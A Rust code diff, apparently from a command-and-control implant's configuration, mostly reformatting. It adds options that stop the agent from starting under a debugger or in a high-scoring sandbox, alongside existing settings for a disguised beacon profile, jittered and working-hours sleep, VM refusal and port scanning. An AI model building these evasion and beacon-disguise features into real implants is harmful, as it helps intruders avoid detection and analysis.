@@ -2,7 +2,6 @@ use crate::normalized_transport::TrafficProfile;
 use serde::{Deserialize, Serialize};
 use std::path::PathBuf;
 
-
 #[derive(serde::Serialize, serde::Deserialize, Debug, Clone, Default, PartialEq, Eq)]
 #[serde(rename_all = "kebab-case")]
 pub enum ExecStrategy {
@@ -11,7 +10,6 @@ pub enum ExecStrategy {
     Direct,
     Fallback,
 }
-
 
 #[derive(serde::Serialize, serde::Deserialize, Debug, Clone, PartialEq, Eq)]
 #[serde(rename_all = "kebab-case")]
@@ -39,13 +37,17 @@ pub struct SleepConfig {
     #[serde(default)]
     pub working_hours_start: Option<u32>, // e.g. 9 for 09:00
     #[serde(default)]
-    pub working_hours_end: Option<u32>,   // e.g. 17 for 17:00
+    pub working_hours_end: Option<u32>, // e.g. 17 for 17:00
     #[serde(default)]
     pub off_hours_multiplier: Option<f32>,
 }
 
-fn default_base_interval() -> u64 { 30 }
-fn default_jitter_percent() -> u32 { 20 }
+fn default_base_interval() -> u64 {
+    30
+}
+fn default_jitter_percent() -> u32 {
+    20
+}
 
 impl Default for SleepConfig {
     fn default() -> Self {
@@ -86,10 +88,18 @@ pub struct MalleableProfile {
     pub doh_beacon_sentinel: String,
 }
 
-fn default_user_agent() -> String { "Mozilla/5.0 (Windows NT 10.0; Win64; x64)".to_string() }
-fn default_uri() -> String { "/api/v1/update".to_string() }
-fn default_host_header() -> String { "cdn.example.com".to_string() }
-fn default_doh_beacon_sentinel() -> String { "1.2.3.4".to_string() }
+fn default_user_agent() -> String {
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)".to_string()
+}
+fn default_uri() -> String {
+    "/api/v1/update".to_string()
+}
+fn default_host_header() -> String {
+    "cdn.example.com".to_string()
+}
+fn default_doh_beacon_sentinel() -> String {
+    "1.2.3.4".to_string()
+}
 
 impl Default for MalleableProfile {
     fn default() -> Self {
@@ -104,7 +114,6 @@ impl Default for MalleableProfile {
         }
     }
 }
-
 
 #[derive(serde::Serialize, serde::Deserialize, Debug, Clone)]
 #[serde(rename_all = "kebab-case")]
@@ -143,6 +152,16 @@ pub struct Config {
     /// legitimate enterprise endpoints today are virtualized.
     #[serde(default)]
     pub refuse_in_vm: bool,
+    /// When `true`, the agent refuses to start if a debugger is attached to
+    /// the agent process itself. Defaults to `false`; debugger detection is
+    /// otherwise reported as telemetry only.
+    #[serde(default)]
+    pub refuse_when_debugged: bool,
+    /// Optional sandbox-score threshold. When set, startup is refused only if
+    /// the combined sandbox score is greater than or equal to this value.
+    /// Leave unset to keep sandbox scoring informational.
+    #[serde(default)]
+    pub sandbox_score_threshold: Option<u32>,
     /// SHA-256 fingerprint (64 lowercase hex chars) of the Orchestra Control
     /// Center's TLS certificate. When set, `outbound-c` mode pins the server
     /// certificate instead of accepting any certificate.
@@ -212,6 +231,8 @@ impl Default for Config {
             traffic_profile: TrafficProfile::default(),
             required_domain: None,
             refuse_in_vm: false,
+            refuse_when_debugged: false,
+            sandbox_score_threshold: None,
             server_cert_fingerprint: None,
             port_scan_concurrency: default_port_scan_concurrency(),
             port_scan_timeout_ms: default_port_scan_timeout(),
